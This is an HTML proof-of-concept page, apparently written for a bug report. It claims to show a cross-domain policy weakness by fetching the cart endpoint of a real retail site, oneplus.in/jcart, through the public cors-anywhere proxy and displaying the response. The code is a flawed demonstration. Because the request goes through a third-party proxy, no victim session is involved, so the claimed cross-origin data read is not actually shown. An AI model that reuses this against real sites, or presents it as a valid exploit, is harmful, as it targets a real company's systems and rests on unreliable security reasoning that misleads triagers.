<!DOCTYPE html>
<html>
<head>
    <title>Cross-DomainfkrPolicy PoC</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        #output {
            white-space: pre-wrap; /* Preserve whitespace and formatting */
            background-color: #f0f0f0;
            padding: 10px;
            border: 1px solid #ccc;
            margin-top: 10px;
        }
        #loading {
            display: none;
            font-weight: bold;
        }
    </style>
    <script>
        function makeRequest() {
            document.getElementById("loading").style.display = "block"; // Show loading message
            document.getElementById("output").innerText = ""; // Clear previous output

            fetch('https://cors-anywhere.herokuapp.com/https://www.oneplus.in/jcart')
                .then(response => {
                    if (response.ok) {
                        return response.text();
                    }
                    throw new Error('Network response was not ok.');
                })
                .then(data => {
                    console.log("Data received:", data);
                    document.getElementById("output").innerText = data;
                })
                .catch(error => {
                    console.error("Error fetching data:", error);
                    document.getElementById("output").innerText = "Error fetching data: " + error.message;
                })
                .finally(() => {
                    document.getElementById("loading").style.display = "none"; // Hide loading message
                });
        }
    </script>
</head>
<body>
    <h1>Cross-Domain Policy PoC</h1>
    <button onclick="makeRequest()">Make Request</button>
    <div id="loading">Loading...</div>
    <pre id="output"></pre>
</body>
</html>
